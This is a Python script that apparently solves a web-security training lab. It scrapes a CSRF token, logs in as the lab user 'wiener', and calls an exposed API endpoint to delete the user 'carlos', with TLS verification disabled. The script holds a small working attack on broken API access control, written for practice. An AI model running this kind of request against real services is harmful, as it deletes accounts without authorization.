import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting an API endpoint using documentation"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the login page\n2. Extract the csrf token and session cookie to login\n3. Login as wiener to get a valid session\n4. Delete carlos\n""")

    print(Fore.WHITE + "[1] Fetching the login page")
    login_page = requests.get(
        f"{url}/login", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[2] Extracting the csrf token and session cookie")
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    print(Fore.GREEN + "CSRF token" + Fore.WHITE +
          " => " + Fore.YELLOW + csrf_token)

    print(Fore.WHITE + "[3] Logging in as wiener")
    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    login_as_wiener = requests.post(
        f"{url}/login", data=data,cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[4] Deleting carlos from the admin panel")
    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }

    try:
        r = requests.delete(
            f"{url}/api/user/carlos", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
